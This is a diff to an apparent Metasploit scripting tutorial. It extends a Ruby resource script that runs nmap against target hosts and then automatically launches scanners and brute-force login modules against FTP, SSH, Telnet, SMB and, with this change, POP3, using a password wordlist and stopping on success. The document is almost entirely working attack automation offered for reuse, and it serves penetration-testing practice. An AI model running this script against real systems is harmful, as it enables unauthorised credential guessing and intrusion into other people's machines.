@@ -328,7 +328,8 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
         Description:
           This Metasploit RC file can be used to automate the exploitation process.
           In this example we are using db_nmap to populate msfdb database with hosts
-          then trigger auxiliary/scanners based on target ports capture by db_nmap.
+          then it triggers auxiliary/scanners based on target open ports reported.
+          this module probes for 21:22:23:110:445 remote TCP ports open.
 
         Execute in msfconsole:
           setg RHOSTS <hosts-separated-by-spaces>
@@ -348,7 +349,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
       end
 
-      run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,445 --script=smb-os-discovery.nse,http-headers.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
+      run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,110,445 --script=smb-os-discovery.nse,http-headers.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
       run_single("services")
       print_good("Reading msfdb database.")
       xhost = framework.db.hosts.map(&:address).join(' ')
@@ -402,6 +403,17 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("exploit")
          end
 
+         if xport =~ /110/i
+              print_warning("Remote Target port: 110 pop3 found")
+              run_single("use auxiliary/scanner/pop3/pop3_version")
+              run_single("set THREADS 30")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/pop3/pop3_login")
+              run_single("set STOP_ON_SUCCESS true")
+              run_single("set THREADS 16")
+              run_single("exploit")
+         end
+
          if xport =~ /445/i
               print_warning("Remote Target port: 445 smb found")
               run_single("use auxiliary/scanner/smb/smb_version")
@@ -434,7 +446,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          end
       print_warning("please wait, Cleaning msfdb Database.")
       run_single("unsetg RHOSTS USERPASS_FILE")
-      run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED USERPASS_FILE")
+      run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED USERPASS_FILE STOP_ON_SUCCESS")
      run_single("services -d")
      run_single("hosts -d")
    </ruby>
